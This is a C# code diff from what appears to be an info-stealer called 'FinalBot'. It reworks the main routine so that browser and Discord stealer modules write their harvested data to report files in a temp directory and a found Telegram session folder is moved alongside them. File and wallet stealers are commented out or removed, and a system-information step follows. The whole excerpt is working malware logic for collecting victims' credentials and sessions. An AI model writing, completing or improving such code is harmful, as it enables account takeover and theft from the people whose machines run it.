@@ -18,19 +18,25 @@ namespace FinalBot
             {
                 // 1. Run Stealers
                 var browserStealer = new BrowserStealer();
-                await browserStealer.RunAll(); // This should ideally write to files in tempDir
+                string browserReport = await browserStealer.RunAll(); 
+                File.WriteAllText(Path.Combine(tempDir, "Browsers.txt"), browserReport);
 
                 var discordStealer = new DiscordStealer();
-                await discordStealer.Run(); // Same here
+                string discordReport = await discordStealer.Run();
+                File.WriteAllText(Path.Combine(tempDir, "Discord.txt"), discordReport);
 
                 var telegramStealer = new TelegramStealer();
-                await telegramStealer.Run(tempDir);
+                string tgResult = telegramStealer.Run();
+                if (!tgResult.StartsWith("❌") && Directory.Exists(tgResult))
+                {
+                    // If Telegram session found, move to report dir
+                    Directory.Move(tgResult, Path.Combine(tempDir, "Telegram"));
+                }
 
-                var fileStealer = new FileStealer();
-                await fileStealer.Run(tempDir);
+                // Others (assuming they might exist or handled similarly)
+                // var fileStealer = new FileStealer();
+                // await fileStealer.Run(tempDir);
 
-                var walletStealer = new WalletStealer();
-                await walletStealer.Run(tempDir);
 
                 // 2. System Info
                 string sysInfo = SystemInfoModule.GetSystemInfo();
